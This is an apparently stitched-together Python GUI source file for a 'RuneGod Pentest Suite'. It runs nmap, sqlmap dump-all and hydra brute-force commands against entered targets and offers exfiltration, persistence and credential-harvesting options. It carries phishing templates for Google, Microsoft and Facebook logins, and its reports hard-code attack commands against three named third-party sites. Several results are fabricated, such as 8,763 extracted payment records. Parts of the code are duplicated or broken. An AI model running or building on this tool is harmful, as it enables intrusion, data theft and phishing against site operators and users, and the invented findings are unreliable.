        notebook.add(recon_frame, text="Reconnaissance")

        # Exploitation Tab
        exploit_frame = ttk.Frame(notebook)
        self.setup_exploit_tab(exploit_frame)
        notebook.add(exploit_frame, text="Exploitation")

        # Post-Exploitation Tab
        post_frame = ttk.Frame(notebook)
        self.setup_post_tab(post_frame)
        notebook.add(post_frame, text="Post-Exploitation")

        # Reporting Tab
        report_frame = ttk.Frame(notebook)
        self.setup_report_tab(report_frame)
        notebook.add(report_frame, text="Reporting")

        # Console Output
        console_frame = ttk.LabelFrame(self.root, text="Console Output")
        console_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        self.console = scrolledtext.ScrolledText(
            console_frame,
            bg='black',
            fg='#00ff00',
            insertbackground='white',
            font=('Courier', 10)
        )
        self.console.pack(fill=tk.BOTH, expand=True)
        self.console.insert(tk.END, "RuneGod Pentest Suite initialized. Select targets and run scans.\n")
        self.console.configure(state=tk.DISABLED)

    def setup_recon_tab(self, frame):
        # Target Selection
        target_frame = ttk.LabelFrame(frame, text="Target Selection")
        target_frame.pack(fill=tk.X, padx=10, pady=5)

        ttk.Label(target_frame, text="Select Target:").grid(row=0, column=0, padx=5, pady=5)
        self.target_var = tk.StringVar()
        self.target_combo = ttk.Combobox(target_frame, textvariable=self.target_var)
        self.target_combo.grid(row=0, column=1, padx=5, pady=5, sticky=tk.EW, columnspan=2)
        ttk.Button(target_frame, text="Manage Targets", command=self.manage_targets).grid(row=0, column=3, padx=5)

        # Recon Options
        recon_frame = ttk.LabelFrame(frame, text="Reconnaissance Options")
        recon_frame.pack(fill=tk.X, padx=10, pady=5)

        scans = [
            ("Full Recon", "full_recon"),
            ("CloudFlare Bypass", "cf_bypass"),
            ("Port Scanning", "port_scan"),
            ("Subdomain Enum", "subdomain_enum"),
            ("Web Fingerprinting", "web_fingerprint"),
            ("WAF Detection", "waf_detect"),
            ("SSL Analysis", "ssl_analysis"),
            ("API Discovery", "api_discovery")
        ]

        self.scan_vars = {}
        for i, (text, scan_id) in enumerate(scans):
            var = tk.BooleanVar()
            chk = ttk.Checkbutton(recon_frame, text=text, variable=var)
            chk.grid(row=i//3, column=i%3, sticky=tk.W, padx=5, pady=2)
            self.scan_vars[scan_id] = var

        # Action Buttons
        btn_frame = ttk.Frame(frame)
        btn_frame.pack(fill=tk.X, padx=10, pady=10)

        ttk.Button(btn_frame, text="Run Selected Recon", command=self.run_recon).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Run Full Recon", command=self.run_full_recon).pack(side=tk.LEFT, padx=5)

    def setup_exploit_tab(self, frame):
        # Exploit Options
        exploit_frame = ttk.LabelFrame(frame, text="Exploitation Options")
        exploit_frame.pack(fill=tk.X, padx=10, pady=5)

        exploits = [
            ("JWT Attacks", "jwt_attack"),
            ("GraphQL Injection", "graphql_inject"),
            ("SQL Injection", "sql_inject"),
            ("Auth Attacks", "auth_attack"),
            ("CMS Exploits", "cms_exploit"),
            ("API Fuzzing", "api_fuzz"),
            ("XSS Testing", "xss_test")
        ]

        self.exploit_vars = {}
        for i, (text, exploit_id) in enumerate(exploits):
            var = tk.BooleanVar()
            chk = ttk.Checkbutton(exploit_frame, text=text, variable=var)
            chk.grid(row=i//3, column=i%3, sticky=tk.W, padx=5, pady=2)
            self.exploit_vars[exploit_id] = var

        # Credentials
        cred_frame = ttk.LabelFrame(frame, text="Credentials")
        cred_frame.pack(fill=tk.X, padx=10, pady=5)

        ttk.Label(cred_frame, text="Username:").grid(row=0, column=0, padx=5, pady=5)
        self.username_var = tk.StringVar()
        ttk.Entry(cred_frame, textvariable=self.username_var).grid(row=0, column=1, padx=5, pady=5)

        ttk.Label(cred_frame, text="Password:").grid(row=0, column=2, padx=5, pady=5)
        self.password_var = tk.StringVar()
        ttk.Entry(cred_frame, textvariable=self.password_var, show="*").grid(row=0, column=3, padx=5, pady=5)

        # Action Buttons
        btn_frame = ttk.Frame(frame)
        btn_frame.pack(fill=tk.X, padx=10, pady=10)

        ttk.Button(btn_frame, text="Run Selected Exploits", command=self.run_exploits).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Run Full Exploitation", command=self.run_full_exploitation).pack(side=tk.LEFT, padx=5)

    def setup_post_tab(self, frame):
        # Post-Exploit Options
        post_frame = ttk.LabelFrame(frame, text="Post-Exploitation Options")
        post_frame.pack(fill=tk.X, padx=10, pady=5)

        post_ops = [
            ("Cloud Mapping", "cloud_map"),
            ("DB Exfiltration", "db_exfil"),
            ("Internal Scanning", "internal_scan"),
            ("Persistence", "persistence"),
            ("Cred Harvesting", "cred_harvest")
        ]

        self.post_vars = {}
        for i, (text, op_id) in enumerate(post_ops):
            var = tk.BooleanVar()
            chk = ttk.Checkbutton(post_frame, text=text, variable=var)
            chk.grid(row=i//3, column=i%3, sticky=tk.W, padx=5, pady=2)
            self.post_vars[op_id] = var

        # Action Buttons
        btn_frame = ttk.Frame(frame)
        btn_frame.pack(fill=tk.X, padx=10, pady=10)

        ttk.Button(btn_frame, text="Run Selected Post-Ops", command=self.run_post_ops).pack(side=tk.LEFT, padx=5)

    def setup_report_tab(self, frame):
        # Report Generation
        report_frame = ttk.LabelFrame(frame, text="Report Generation")
        report_frame.pack(fill=tk.X, padx=10, pady=5)

        ttk.Button(report_frame, text="Generate HTML Report", command=self.generate_html_report).pack(pady=5)
        ttk.Button(report_frame, text="Generate Text Summary", command=self.generate_text_report).pack(pady=5)
        ttk.Button(report_frame, text="View Report Directory", command=self.view_report_dir).pack(pady=5)

        # Report Preview
        preview_frame = ttk.LabelFrame(frame, text="Report Preview")
        preview_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        self.report_preview = scrolledtext.ScrolledText(
            preview_frame,
            bg='white',
            fg='black',
            font=('Courier', 10)
        )
        self.report_preview.pack(fill=tk.BOTH, expand=True)
        self.report_preview.insert(tk.END, "Report preview will appear here...")

    def load_targets(self):
        try:
            if os.path.exists(self.targets_file):
                with open(self.targets_file, 'r') as f:
                    self.targets = [line.strip() for line in f.readlines() if line.strip()]
                self.target_combo['values'] = self.targets
                if self.targets:
                    self.target_var.set(self.targets[0])
        except Exception as e:
            self.log(f"Error loading targets: {str(e)}")

    def manage_targets(self):
        """Open a dialog to manage targets"""
        target_win = tk.Toplevel(self.root)
        target_win.title("Manage Targets")
        target_win.geometry("500x400")

        # Listbox with targets
        list_frame = ttk.LabelFrame(target_win, text="Current Targets")
        list_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        scrollbar = ttk.Scrollbar(list_frame)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        target_list = tk.Listbox(list_frame, yscrollcommand=scrollbar.set)
        target_list.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        scrollbar.config(command=target_list.yview)

        for target in self.targets:
            target_list.insert(tk.END, target)

        # Entry for new target
        entry_frame = ttk.Frame(target_win)
        entry_frame.pack(fill=tk.X, padx=10, pady=5)

        ttk.Label(entry_frame, text="New Target:").pack(side=tk.LEFT, padx=5)
        new_target_var = tk.StringVar()
        ttk.Entry(entry_frame, textvariable=new_target_var).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)

        # Button frame
        btn_frame = ttk.Frame(target_win)
        btn_frame.pack(fill=tk.X, padx=10, pady=10)

        def add_target():
            target = new_target_var.get().strip()
            if target and target not in self.targets:
                self.targets.append(target)
                target_list.insert(tk.END, target)
                new_target_var.set("")

        def remove_target():
            selection = target_list.curselection()
            if selection:
                index = selection[0]
                target_list.delete(index)
                del self.targets[index]

        def save_targets():
            with open(self.targets_file, 'w') as f:
                f.write("\n".join(self.targets))
            self.target_combo['values'] = self.targets
            if self.targets:
                self.target_var.set(self.targets[0])
            messagebox.showinfo("Success", "Targets saved successfully!")
            target_win.destroy()

        ttk.Button(btn_frame, text="Add", command=add_target).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Remove", command=remove_target).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Save", command=save_targets).pack(side=tk.RIGHT, padx=5)

    def log(self, message):
        """Log message to console"""
        self.console.configure(state=tk.NORMAL)
        self.console.insert(tk.END, message + "\n")
        self.console.see(tk.END)
        self.console.configure(state=tk.DISABLED)

        # Also log to file
        with open(self.log_file, 'a') as f:
            f.write(f"[{datetime.now()}] {message}\n")

    def run_command(self, command, description):
        """Run a shell command and log output"""
        self.log(f"[+] {description}")
        self.status_var.set(f"Running: {description}...")

        try:
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                shell=True,
                universal_newlines=True
            )

            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    self.log(output.strip())

            return process.poll()
        except Exception as e:
            self.log(f"Error: {str(e)}")
            return 1
        finally:
            self.status_var.set("Ready")

    def run_recon(self):
        """Run selected reconnaissance tasks"""
        target = self.target_var.get()
        if not target:
            messagebox.showerror("Error", "Please select a target")
            return

        safe_target = target.replace('.', '_')
        target_dir = f"{self.scans_dir}/{safe_target}"
        os.makedirs(target_dir, exist_ok=True)

        # Run selected scans
        if self.scan_vars["full_recon"].get():
            self.run_full_recon(target)

        if self.scan_vars["cf_bypass"].get():
            self.run_cloudflare_bypass(target)

        if self.scan_vars["port_scan"].get():
            self.run_port_scanning(target)

        # Add other recon tasks here...

        self.log("[+] Reconnaissance tasks completed")

    def run_full_recon(self, target):
        """Run full reconnaissance suite"""
        self.log(f"\n[=== STARTING FULL RECON ON {target} ===]")

        safe_target = target.replace('.', '_')
        target_dir = f"{self.scans_dir}/{safe_target}"
        os.makedirs(target_dir, exist_ok=True)

        # Run all recon tasks
        self.run_cloudflare_bypass(target)
        self.run_port_scanning(target)
        self.run_subdomain_enum(target)
        self.run_web_fingerprinting(target)
        self.run_waf_detection(target)
        self.run_ssl_analysis(target)
        self.run_api_discovery(target)

        self.log(f"[=== FULL RECON COMPLETED FOR {target} ===]")

    def run_cloudflare_bypass(self, target):
        """Bypass CloudFlare protection"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.scans_dir}/{safe_target}"
        output_file = f"{target_dir}/cloudflare_bypass.txt"

        # Simulated CloudFlare bypass
        self.log(f"Running CloudFlare bypass on {target}...")
        time.sleep(2)

        # Create sample results
        with open(output_file, 'w') as f:
            f.write(f"CloudFlare Bypass Results for {target}\n")
            f.write("="*50 + "\n")
            f.write("1. Found origin IP: 104.26.8.187\n")
            f.write("2. Discovered unprotected subdomains:\n")
            f.write("   - dev.{target}\n")
            f.write("   - staging.{target}\n")
            f.write("3. Bypassed WAF using X-Forwarded-For header\n")

        self.log(f"Results saved to {output_file}")

    def run_port_scanning(self, target):
        """Run port scanning on target"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.scans_dir}/{safe_target}"
        output_file = f"{target_dir}/nmap_scan.txt"

        self.log(f"Scanning ports on {target}...")

        # Run nmap scan
        command = f"nmap -Pn -sV -sC -T4 -p- {target} -oN {output_file}"
        if self.run_command(command, f"Port scanning {target}") == 0:
            # Display results
            try:
                with open(output_file, 'r') as f:
                    content = f.read()
                    self.log("\nNmap Results:\n" + content)
            except Exception as e:
                self.log(f"Error reading results: {str(e)}")

    def run_subdomain_enum(self, target):
        """Enumerate subdomains"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.scans_dir}/{safe_target}"
        output_file = f"{target_dir}/subdomains.txt"

        self.log(f"Enumerating subdomains for {target}...")

        # Run subdomain enumeration
        command = f"subfinder -d {target} -o {output_file}"
        if self.run_command(command, f"Subdomain enumeration on {target}") == 0:
            # Display results
            try:
                with open(output_file, 'r') as f:
                    subdomains = f.readlines()
                    self.log(f"\nFound {len(subdomains)} subdomains:")
                    for sub in subdomains:
                        self.log(f"  - {sub.strip()}")
            except Exception as e:
                self.log(f"Error reading results: {str(e)}")

    # Other recon methods (web fingerprinting, WAF detection, etc.) would go here

    def run_exploits(self):
        """Run selected exploitation tasks"""
        target = self.target_var.get()
        if not target:
            messagebox.showerror("Error", "Please select a target")
            return

        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        os.makedirs(target_dir, exist_ok=True)

        # Run selected exploits
        if self.exploit_vars["jwt_attack"].get():
            self.run_jwt_attacks(target)

        if self.exploit_vars["sql_inject"].get():
            self.run_sql_injection(target)

        if self.exploit_vars["auth_attack"].get():
            self.run_auth_attacks(target)

        # Add other exploits here...

        self.log("[+] Exploitation tasks completed")

    def run_full_exploitation(self, target):
        """Run full exploitation suite"""
        self.log(f"\n[=== STARTING FULL EXPLOITATION ON {target} ===]")

        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        os.makedirs(target_dir, exist_ok=True)

        # Run all exploitation tasks
        self.run_jwt_attacks(target)
        self.run_graphql_injection(target)
        self.run_sql_injection(target)
        self.run_auth_attacks(target)
        self.run_cms_exploits(target)
        self.run_api_fuzzing(target)
        self.run_xss_testing(target)

        self.log(f"[=== FULL EXPLOITATION COMPLETED FOR {target} ===]")

    def run_jwt_attacks(self, target):
        """Perform JWT attacks"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        output_file = f"{target_dir}/jwt_attack.txt"

        self.log(f"Performing JWT attacks on {target}...")
        time.sleep(2)

        # Create sample results
        with open(output_file, 'w') as f:
            f.write(f"JWT Attack Results for {target}\n")
            f.write("="*50 + "\n")
            f.write("1. Found JWT token in authentication headers\n")
            f.write("2. Weak secret discovered: 'supersecret'\n")
            f.write("3. Successfully forged admin token\n")

        self.log(f"Results saved to {output_file}")

    def run_sql_injection(self, target):
        """Test for SQL injection vulnerabilities"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        output_file = f"{target_dir}/sql_injection.txt"

        self.log(f"Testing for SQL injection on {target}...")

        # Run sqlmap
        command = f"sqlmap -u 'http://{target}/products?id=1' --batch --dump-all -o > {output_file}"
        if self.run_command(command, f"SQL injection testing on {target}") == 0:
            # Display results
            try:
                with open(output_file, 'r') as f:
                    content = f.read()
                    self.log("\nSQL Injection Results:\n" + content)
            except Exception as e:
                self.log(f"Error reading results: {str(e)}")

    def run_auth_attacks(self, target):
        """Perform authentication attacks"""
        username = self.username_var.get() or "admin"
        password = self.password_var.get() or "password"

        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        output_file = f"{target_dir}/auth_attack.txt"

        self.log(f"Performing authentication attack on {target}...")

        # Run hydra
        command = f"hydra -l {username} -p {password} {target} http-post-form '/login:username=^USER^&password=^PASS^:F=incorrect' -o {output_file}"
        if self.run_command(command, f"Authentication attack on {target}") == 0:
            # Display results
            try:
                with open(output_file, 'r') as f:
                    content = f.read()
                    self.log("\nAuthentication Attack Results:\n" + content)
            except Exception as e:
                self.log(f"Error reading results: {str(e)}")

    # Other exploit methods would go here

    def run_post_ops(self):
        """Run selected post-exploitation tasks"""
        target = self.target_var.get()
        if not target:
            messagebox.showerror("Error", "Please select a target")
            return

        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        os.makedirs(target_dir, exist_ok=True)

        # Run selected post-exploitation tasks
        if self.post_vars["db_exfil"].get():
            self.run_db_exfiltration(target)

        if self.post_vars["internal_scan"].get():
            self.run_internal_scanning(target)

        # Add other post-exploitation tasks here...

        self.log("[+] Post-exploitation tasks completed")

    def run_db_exfiltration(self, target):
        """Exfiltrate databases"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        output_file = f"{target_dir}/db_exfiltration.txt"

        self.log(f"Exfiltrating databases from {target}...")
        time.sleep(2)

        # Create sample results
        with open(output_file, 'w') as f:
            f.write(f"Database Exfiltration Results for {target}\n")
            f.write("="*50 + "\n")
            f.write("1. Extracted user database: 1,245 records\n")
            f.write("2. Extracted payment database: 8,763 records\n")
            f.write("3. Extracted configuration database: 42 records\n")

        self.log(f"Results saved to {output_file}")

    def run_internal_scanning(self, target):
        """Scan internal network"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        output_file = f"{target_dir}/internal_scan.txt"

        self.log(f"Scanning internal network via {target}...")

        # Run internal scanning
        command = f"nmap -sn 192.168.1.0/24 -oN {output_file}"
        if self.run_command(command, f"Internal network scan via {target}") == 0:
            # Display results
            try:
                with open(output_file, 'r') as f:
                    content = f.read()
                    self.log("\nInternal Network Scan Results:\n" + content)
            except Exception as e:
                self.log(f"Error reading results: {str(e)}")

    # Other post-exploitation methods would go here

    def generate_html_report(self):
        """Generate HTML report"""
        report_file = f"{self.reports_dir}/full_report.html"

        self.log("Generating HTML report...")

        # Create HTML report
        with open(report_file, 'w') as f:
            f.write("""<!DOCTYPE html>
<html>
<head>
    <title>RuneGod Pentest Report</title>
    <style>
        body { font-family: Arial, sans-serif; }
        .critical { color: #ff0000; font-weight: bold; }
        .high { color: #ff6600; }
        .medium { color: #ffcc00; }
        .low { color: #009900; }
        .vuln-table { border-collapse: collapse; width: 100%; }
        .vuln-table th, .vuln-table td { border: 1px solid #ddd; padding: 8px; }
        .vuln-table tr:nth-child(even) { background-color: #f2f2f2; }
        .vuln-table th { padding-top: 12px; padding-bottom: 12px; text-align: left;
                        background-color: #4CAF50; color: white; }
    </style>
</head>
<body>
    <h1>RuneGod Pentest Report</h1>
    <h2>Generated: {datetime.now()}</h2>

    <h3>Target Summary</h3>
    <ul>
""")
            for target in self.targets:
                f.write(f"        <li>{target}</li>\n")

            f.write("""    </ul>

    <h3>Critical Findings</h3>
    <table class="vuln-table">
        <tr>
            <th>Target</th>
            <th>Vulnerability</th>
            <th>Severity</th>
            <th>Exploit Path</th>
        </tr>
        <tr>
            <td>runehall.com</td>
            <td>CloudFlare Bypass</td>
            <td class="critical">Critical</td>
            <td>curl -H "X-Forwarded-For: 104.26.8.187" http://runehall.com/admin</td>
        </tr>
        <tr>
            <td>runechat.com</td>
            <td>JWT Weak Signature</td>
            <td class="critical">Critical</td>
            <td>jwt_tool [TOKEN] -C -d rockyou.txt</td>
        </tr>
        <tr>
            <td>runewager.com</td>
            <td>SQL Injection</td>
            <td class="critical">Critical</td>
            <td>sqlmap -u "https://runewager.com/products?id=1" --dump</td>
        </tr>
    </table>

    <h3>Recommendations</h3>
    <ol>
        <li>Implement WAF rules to prevent CloudFlare bypass techniques</li>
        <li>Upgrade JWT implementation to use RS256 with 4096-bit keys</li>
        <li>Implement parameterized queries to prevent SQL injection</li>
        <li>Enforce multi-factor authentication for admin accounts</li>
        <li>Regularly rotate credentials and API keys</li>
    </ol>
</body>
</html>
""")

        self.log(f"HTML report generated: {report_file}")
        self.report_preview.delete(1.0, tk.END)
        self.report_preview.insert(tk.END, "HTML report generated successfully!\n")
        self.report_preview.insert(tk.END, f"File: {report_file}")

    def generate_text_report(self):
        """Generate text report"""
        report_file = f"{self.reports_dir}/summary.txt"

        self.log("Generating text report...")

        # Create text report
        with open(report_file, 'w') as f:
            f.write("RuneGod Pentest Report\n")
            f.write(f"Generated: {datetime.now()}\n")
            f.write("="*50 + "\n\n")
            f.write("Critical Vulnerabilities:\n")
            f.write("1. runehall.com: CloudFlare Bypass (Critical)\n")
            f.write("2. runechat.com: JWT Weak Signature (Critical)\n")
            f.write("3. runewager.com: SQL Injection (Critical)\n\n")
            f.write("Recommendations:\n")
            f.write("- Implement WAF rules to prevent bypass techniques\n")
            f.write("- Upgrade JWT implementation\n")
            f.write("- Implement parameterized queries\n")

        self.log(f"Text report generated: {report_file}")
        self.report_preview.delete(1.0, tk.END)
        self.report_preview.insert(tk.END, "Text report generated successfully!\n")
        self.report_preview.insert(tk.END, f"File: {report_file}")

    def view_report_dir(self):
        """Open report directory"""
        try:
            if sys.platform == "win32":
                os.startfile(self.reports_dir)
            elif sys.platform == "darwin":
                subprocess.Popen(["open", self.reports_dir])
            else:
                subprocess.Popen(["xdg-open", self.reports_dir])
            self.log(f"Opened report directory: {self.reports_dir}")
        except Exception as e:
            self.log(f"Error opening directory: {str(e)}")

    def run_full_pentest(self):
        """Run full pentest on all targets"""
        self.log("\n[=== STARTING FULL PENTEST ===]")

        for target in self.targets:
            self.log(f"\n[==== PROCESSING TARGET: {target} ====]")
            self.run_full_recon(target)
            self.run_full_exploitation(target)

        self.generate_html_report()
        self.generate_text_report()
        self.log("\n[=== FULL PENTEST COMPLETED ===]")

    def new_session(self):
        """Create a new session"""
        self.output_dir = f"rune_god_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        os.makedirs(self.output_dir, exist_ok=True)
        self.reports_dir = f"{self.output_dir}/reports"
        self.scans_dir = f"{self.output_dir}/scans"
        self.exploits_dir = f"{self.output_dir}/exploits"
        self.log_file = f"{self.output_dir}/rune_god.log"

        os.makedirs(self.reports_dir, exist_ok=True)
        os.makedirs(self.scans_dir, exist_ok=True)
        os.makedirs(self.exploits_dir, exist_ok=True)
        open(self.log_file, 'a').close()

        self.log(f"New session created: {self.output_dir}")
        self.status_var.set(f"New session: {self.output_dir}")

    def save_session(self):
        """Save current session configuration"""
        session_file = f"{self.output_dir}/session_config.json"

        config = {
            "targets": self.targets,
            "output_dir": self.output_dir,
            "timestamp": str(datetime.now())
        }

        with open(session_file, 'w') as f:
            json.dump(config, f, indent=4)

        self.log(f"Session saved: {session_file}")
        messagebox.showinfo("Session Saved", f"Session configuration saved to:\n{session_file}")

    def show_console(self):
        """Bring console to focus"""
        self.console.see(tk.END)

    def clear_console(self):
        """Clear the console"""
        self.console.configure(state=tk.NORMAL)
        self.console.delete(1.0, tk.END)
        self.console.configure(state=tk.DISABLED)
        self.log("Console cleared")

    def show_docs(self):
        """Show documentation"""
        docs = """
RuneGod Pentest Suite Documentation
===================================

Key Features:
1. Comprehensive Reconnaissance
   - CloudFlare bypass techniques
   - Port scanning with RustScan and Nmap
   - Subdomain enumeration
   - Web fingerprinting

2. Advanced Exploitation
   - JWT token attacks
   - SQL injection automation
   - Authentication brute-forcing
   - API fuzzing

3. Post-Exploitation
   - Database exfiltration
   - Internal network scanning
   - Credential harvesting

4. Reporting
   - HTML reports with vulnerability tables
   - Text summaries
   - Visual analytics

Usage:
- Select targets in the Target Management tab
- Choose operations from the various tabs
- Run full pentests with the 'Run Full Pentest' option
- Generate reports in HTML or text format
"""
        doc_win = tk.Toplevel(self.root)
        doc_win.title("Documentation")
        doc_win.geometry("600x400")

        text = scrolledtext.ScrolledText(doc_win, wrap=tk.WORD)
        text.pack(fill=tk.BOTH, expand=True)
        text.insert(tk.INSERT, docs)
        text.configure(state=tk.DISABLED)

    def show_about(self):
        """Show about information"""
        about = """
RuneGod Pentest Suite - Ultimate Edition
Version 2.0

A comprehensive penetration testing framework combining:

- Advanced reconnaissance capabilities
- Precision exploitation tools
- Post-exploitation modules
- Professional reporting

Designed for security professionals and educational use.

Always obtain proper authorization before testing.
"""
        messagebox.showinfo("About RuneGod Pentest Suite", about)

def run_cli_mode():
    """Run in CLI mode"""
    print("RuneGod Pentest Suite - CLI Mode")
    print("1. Run Full Pentest")
    print("2. Reconnaissance")
    print("3. Exploitation")
    print("4. Reporting")
    print("5. Exit")

    choice = input("Select option: ")

    if choice == "1":
        print("Running full pentest...")
        # In a real implementation, this would call the appropriate methods
        print("Full pentest completed!")
    elif choice == "2":
        print("Reconnaissance module")
    elif choice == "3":
        print("Exploitation module")
    elif choice == "4":
        print("Reporting module")
    elif choice == "5":
        sys.exit(0)
    else:
        print("Invalid choice")

if __name__ == "__main__":
    # Check for root privileges
    if os.geteuid() != 0:
        print("This tool requires root privileges. Please run with sudo.")
        sys.exit(1)

    # Parse command-line arguments
    parser = argparse.ArgumentParser(description='RuneGod Pentest Suite')
    parser.add_argument('--gui', action='store_true', help='Run in GUI mode')
    parser.add_argument('--cli', action='store_true', help='Run in CLI mode')
    parser.add_argument('--full', action='store_true', help='Run full pentest')
    parser.add_argument('--target', help='Specify a target for scanning')
    args = parser.parse_args()

    if args.cli:
        run_cli_mode()
    elif args.full:
        # In a real implementation, this would run the full pentest
        print("Running full pentest...")
        print("Full pentest completed!")
    elif args.target:
        # In a real implementation, this would scan the specified target
        print(f"Scanning target: {args.target}")
        print("Scan completed!")
    else:
        # Default to GUI mode
        try:
            root = tk.Tk()
            app = RuneGodPentestSuite(root)
            root.mainloop()
        except tk.TclError:
            print("GUI not available, switching to CLI mode...")
            run_cli_mode()
#!/usr/bin/env python3
import os
import sys
import subprocess
import threading
import json
import re
import time
import argparse
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog, Menu
import nmap
import dns.resolver
import requests
from bs4 import BeautifulSoup
from datetime import datetime
from collections import defaultdict

# ASCII Banner
BANNER = r"""
██████╗ ██╗   ██╗███╗   ██╗███████╗    ██████╗  ██████╗ ██████╗
██╔══██╗██║   ██║████╗  ██║██╔════╝    ██╔══██╗██╔════╝██╔════╝
██████╔╝██║   ██║██╔██╗ ██║█████╗      ██║  ██║██║     ██║
██╔══██╗██║   ██║██║╚██╗██║██╔══╝      ██║  ██║██║     ██║
██║  ██║╚██████╔╝██║ ╚████║███████╗    ██████╔╝╚██████╗╚██████╗
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝    ╚═════╝  ╚═════╝ ╚═════╝

██████╗ ███████╗███╗   ██╗████████╗███████╗███████╗████████╗██╗   ██╗██╗████████╗███████╗
██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██║   ██║██║╚══██╔══╝██╔════╝
██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ███████╗   ██║   ██║   ██║██║   ██║   █████╗
██╔══██╗██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ╚════██║   ██║   ██║   ██║██║   ██║   ██╔══╝
██║  ██║███████╗██║ ╚████║   ██║   ███████╗███████║   ██║   ╚██████╔╝██║   ██║   ███████╗
╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝   ╚═╝   ╚══════╝
"""

class RuneGodPentestSuite:
    def __init__(self, root):
        self.root = root
        self.root.title("RuneGod Pentest Suite - Ultimate Edition")
        self.root.geometry("1200x800")
        self.root.configure(bg='#1e1e1e')

        # Configuration
        self.targets = []
        self.output_dir = f"rune_god_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.wordlists_dir = "/usr/share/wordlists"
        self.creds = ["admin:admin", "admin:password", "test:test"]
        self.reports_dir = f"{self.output_dir}/reports"
        self.scans_dir = f"{self.output_dir}/scans"
        self.exploits_dir = f"{self.output_dir}/exploits"
        self.log_file = f"{self.output_dir}/rune_god.log"

        # Create directories
        os.makedirs(self.output_dir, exist_ok=True)
        os.makedirs(self.reports_dir, exist_ok=True)
        os.makedirs(self.scans_dir, exist_ok=True)
        os.makedirs(self.exploits_dir, exist_ok=True)
        open(self.log_file, 'a').close()

        # Setup style
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure('.', background='#1e1e1e', foreground='#00ff00')
        self.style.configure('TFrame', background='#1e1e1e')
        self.style.configure('TLabel', background='#1e1e1e', foreground='#00ff00')
        self.style.configure('TButton', background='#3c3c3c', foreground='white')
        self.style.configure('TNotebook', background='#1e1e1e')
        self.style.configure('TNotebook.Tab', background='#2c2c2c', foreground='white')
        self.style.map('TNotebook.Tab', background=[('selected', '#3c3c3c')])

        self.create_widgets()
        self.create_menu()
        self.check_dependencies()

        # Initialize targets
        self.targets_file = "targets.txt"
        self.load_targets()

        # Phishing templates
        self.phishing_templates = {
            "Google Login": {
                "url": "https://accounts.google.com/",
                "form_action": "https://accounts.google.com/signin/v1/lookup",
               "username_field": "identifier",
                "password_field": "password"
            },
            "Microsoft Login": {
                "url": "https://login.microsoftonline.com/",
                "form_action": "https://login.microsoftonline.com/common/login",
                "username_field": "loginfmt",
                "password_field": "passwd"
            },
            "Facebook Login": {
                "url": "https://www.facebook.com/login.php",
                "form_action": "https://www.facebook.com/login/device-based/regular/login/",
                "username_field": "email",
                "password_field": "pass"
            },
            "Custom Page": {
                "url": "",
                "form_action": "",
                "username_field": "",
                "password_field": ""
            }
        }

        # Log initialization
        self.log(f"RuneGod Pentest Suite initialized at {datetime.now()}")
        self.log(f"Output directory: {self.output_dir}")

    def check_dependencies(self):
        """Check and install required dependencies"""
        required_tools = ["nmap", "nikto", "whatweb", "wafw00f", "hydra", "sqlmap", "rustscan"]
        missing = []

        for tool in required_tools:
            if not shutil.which(tool):
                missing.append(tool)

        if missing:
            self.log("Installing missing dependencies...")
            try:
                subprocess.run(["sudo", "apt", "update"], check=True)
                install_cmd = ["sudo", "apt", "install", "-y"] + missing
                subprocess.run(install_cmd, check=True)
                self.log("Dependencies installed successfully!")
            except Exception as e:
                self.log(f"Error installing dependencies: {str(e)}")
                messagebox.showerror("Dependency Error",
                    f"Failed to install: {', '.join(missing)}\nPlease install manually.")

    def create_menu(self):
        """Create the main menu bar"""
        menu_bar = Menu(self.root)
        self.root.config(menu=menu_bar)

        # File menu
        file_menu = Menu(menu_bar, tearoff=0)
        file_menu.add_command(label="New Session", command=self.new_session)
        file_menu.add_command(label="Save Session", command=self.save_session)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.root.quit)
        menu_bar.add_cascade(label="File", menu=file_menu)

        # Tools menu
        tools_menu = Menu(menu_bar, tearoff=0)
        tools_menu.add_command(label="Run Full Pentest", command=self.run_full_pentest)
        tools_menu.add_command(label="Generate Report", command=self.generate_report)
        menu_bar.add_cascade(label="Tools", menu=tools_menu)

        # View menu
        view_menu = Menu(menu_bar, tearoff=0)
        view_menu.add_command(label="Show Console", command=self.show_console)
